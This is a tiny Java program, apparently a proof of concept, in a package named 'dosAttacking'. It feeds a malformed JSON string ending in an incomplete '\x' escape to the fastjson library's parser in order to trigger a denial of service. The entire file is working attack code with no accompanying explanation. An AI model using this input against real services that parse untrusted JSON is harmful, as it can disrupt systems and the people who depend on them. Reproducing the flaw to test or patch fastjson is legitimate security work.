package com.attack.dosAttacking;

import com.alibaba.fastjson.JSON;

public class Program {
    public static void main(String[] args) {
        final String malformedJsonString = "{\"a\":\"\\x";
        JSON.parse(malformedJsonString);
    }
}
